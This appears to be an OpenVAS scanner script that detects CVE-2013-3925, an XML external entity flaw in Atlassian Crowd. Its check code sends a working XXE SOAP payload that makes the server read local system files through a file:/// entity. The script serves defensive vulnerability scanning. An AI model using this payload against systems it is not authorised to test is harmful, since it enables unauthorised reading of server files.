###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atlassian_crowd_xxe_inj_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# Atlassian Crowd Xml eXternal Entity (XXE) Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803830");
  script_version("$Revision: 9353 $");
  script_cve_id("CVE-2013-3925");
  script_bugtraq_id(60899);
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-07-09 15:27:15 +0530 (Tue, 09 Jul 2013)");
  script_name("Atlassian Crowd Xml eXternal Entity (XXE) Injection Vulnerability");

  tag_summary = "This host is running Atlassian Crowd and is prone to xml external
entity injection vulnerability.";

  tag_vuldetect = "Send a crafted data via HTTP POST request and check whether it is able to
read the system file or not.";

  tag_insight = "Flaw is due to an incorrectly configured XML parser accepting XML external
entities from an untrusted source.";

  tag_impact = "Successful exploitation allow remote attackers to gain access to arbitrary
files by sending specially crafted XML data.

  Impact Level: Application";

  tag_affected = "Atlassian Crowd 2.5.x before 2.5.4, 2.6.x before 2.6.3, 2.3.8, and 2.4.9";

  tag_solution = "Upgrade to version 2.5.4, 2.6.3, 2.7 or higher,
For updates refer to http://www.atlassian.com/software/crowd/download";

  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

  script_xref(name : "URL" , value : "https://jira.atlassian.com/browse/CWD-3366");
  script_xref(name : "URL" , value : "http://www.commandfive.com/papers/C5_TA_2013_3925_AtlassianCrowd.pdf");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8095);
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

port = get_http_port(default:8095);

files = traversal_files();

host = http_host_name( port:port );

## Send and Receive the response
req = http_get(item:"/crowd/console/login.action",  port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if("Atlassian<" >< res && "Crowd Console<" >< res)
{

  url = '/crowd/services/2/';
  req = http_get(item:url,  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if("Invalid SOAP request" >< res)
  {
    entity =  rand_str(length:8,charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

    foreach file (keys(files))
    {
      soap = '<!DOCTYPE x [ <!ENTITY '+ entity +' SYSTEM "file:///'+ files[file] +'"> ]>'+
             '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'+
             '<s:Body>'+
             '<authenticateApplication xmlns="urn:SecurityServer">'+
             '<in0 '+
             'xmlns:a="http://authentication.integration.crowd.atlassian.com" '+
             'xmlns:i="http://www.w3.org/2001/XMLSchema-instance">'+
             '<a:credential>'+
             '<a:credential>password</a:credential>'+
             '<a:encryptedCredential>&'+ entity +';</a:encryptedCredential>'+
             '</a:credential>'+
             '<a:name>username</a:name>'+
             '<a:validationFactors i:nil="true"/>'+
             '</in0>'+
             '</authenticateApplication>'+
             '</s:Body>'+
             '</s:Envelope>';

      len = strlen(soap);

      req = string("POST ",url," HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "User-Agent: ", OPENVAS_HTTP_USER_AGENT,"\r\n",
               "SOAPAction: ",'""',"\r\n",
               "Content-Type: text/xml; charset=UTF-8\r\n",
               "Content-Length: ", len,"\r\n",
               "\r\n",
               soap);

      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if(egrep(pattern:file, string:result))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}
